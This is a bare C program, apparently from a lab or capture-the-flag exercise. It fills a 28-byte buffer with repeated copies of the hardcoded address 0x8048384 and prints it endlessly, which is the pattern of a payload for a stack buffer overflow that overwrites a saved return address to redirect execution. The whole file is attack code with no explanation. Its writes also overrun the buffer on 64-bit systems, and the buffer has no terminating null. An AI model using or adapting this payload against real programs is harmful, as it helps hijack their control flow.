#define SIZE 28
int main(int argc, char **argv)
{
    while(1)
    {
        int i=0;
        char stuffing[SIZE];
        for(i=0;i<SIZE;i+=4)
        {
            *((long *) &stuffing[i]) = 0x8048384 ;
        }
        puts(stuffing);
    }
}
